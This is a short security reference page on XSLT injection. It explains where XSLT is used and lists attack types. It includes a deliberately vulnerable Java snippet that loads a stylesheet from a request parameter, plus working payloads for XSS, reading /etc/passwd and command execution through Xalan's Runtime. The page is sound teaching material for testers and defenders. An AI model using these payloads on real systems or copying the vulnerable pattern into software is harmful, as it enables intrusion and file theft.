#  XSLT Injection
Index | Section
--- | ---
**1** | Introduction
**2** | Common Use-Cases
**3** | Attack Vectors
**4** | Vulnerable Code Snippets
**5** | References & Good Reads

___


#### Introduction
```
1. XSLT stands for Extensible Stylesheet Language Transformations.
2. XSL (Extensible Stylesheet Language) is a language for transforming XML documents and the XSL Transformations are XML documents themselves.
3. The result of the transformation can be a different XML document or something else such as an HTML document, a CSV file or a plain text file.
4. Improper implementation of XSLT may introduce several security issues in the application which may range from Cross-Site Scripting to Remote Code Execution. 
5. The most used frameworks are: Libxslt (Gnome), Xalan (Apache) and Saxon (Saxonica).

```

#### Common Use-Cases

```
1. Report Generation/Data Export Functionality: There are applications which supports report generation/data export in multiple formats such as PDF, XML, CSV, etc and often they may utilize the a custom XSLT based Implementation for this feature.

2. Printing & Emailing Through Application: An XSLT based implementation can be used when an application provides Print/Email functionalities within the application. 

- In General, when there is any type of transformation from one data type to other is observed, there's always a good idea to check if the XSLT is used.

```

#### Attack Vectors
```
- XSLT Injection Attacks can happen when the Data enters a program from an untrusted source and the Data is writtened to an XSL stylesheet.

- There are multiple attack scenarios in a vulnerable XSLT Implementation including but not limited to: 

    1. Cross-Site Scripting 
    2. External Service Interaction
    3. Local File Read
    4. Remote Code Execution
    5. Server-Side Request Forgery
    6. Cross-Site Port Attack
    7. External Entity Injection

- Exploitation Paylods can be Found here: 

    1. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md
    2. https://book.hacktricks.xyz/pentesting-web/xslt-server-side-injection-extensible-stylesheet-languaje-transformations

```

#### Vulnerable Code Snippets

```
## XSLT Implemented in Java 

 ...
  InputStream xmlUrl = Utils.getFromURL(request.getParameter("xmlurl"));
  InputStream xsltUrl = Utils.getFromURL(request.getParameter("xslurl"));

  Source xmlSource = new StreamSource(xmlUrl);
  Source xsltSource = new StreamSource(xsltUrl);
  Result result = new StreamResult(System.out);

  TransformerFactory transFact = TransformerFactory.newInstance();
  Transformer trans = transFact.newTransformer(xsltSource);
  trans.transform(xmlSource, result);
  ...
  
1. Executing XSS in Above Code: 
xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
      <script>alert(123)</script>
    </xsl:template>
  </xsl:stylesheet>
  
2. Executing File Read in Above Code: 
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
      <xsl:copy-of select="document('/etc/passwd')"/>
    </xsl:template>
  </xsl:stylesheet>
  
  
3. Executing Arbitrary Code in Above Code: 
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object">
    <xsl:template match="/">
      <xsl:variable name="rtobject" select="rt:getRuntime()"/>
      <xsl:variable name="process" select="rt:exec($rtobject,'ls')"/>
      <xsl:variable name="processString" select="ob:toString($process)"/>
      <xsl:value-of select="$processString"/>
    </xsl:template>
  </xsl:stylesheet>

```

#### References & Good Reads

```
a.  https://www.contextis.com/en/blog/xslt-server-side-injection-attacks
b. https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt_injection#Java%2FJSP
c. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT%20Injection/README.md
d. https://blog.hunniccyber.com/ektron-cms-remote-code-execution-xslt-transform-injection-java/

```
